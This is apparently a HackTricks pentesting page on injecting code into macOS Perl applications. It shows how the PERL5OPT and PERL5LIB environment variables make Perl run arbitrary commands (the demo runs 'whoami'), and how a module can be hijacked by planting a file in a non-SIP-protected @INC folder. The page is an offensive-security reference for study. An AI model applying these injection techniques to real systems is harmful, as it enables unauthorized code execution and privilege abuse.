# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
For example, create this script:

```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```

Now **export the env variable** and execute the **perl** script:

```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```

Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):

```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```

And then use the env variables:

```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```

## Via dependencies

It's possible to list the dependencies folder order of Perl running:

```bash
perl -e 'print join("\n", @INC)'
```

Which will return something like:

```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```

Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.

> [!WARNING]
> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}



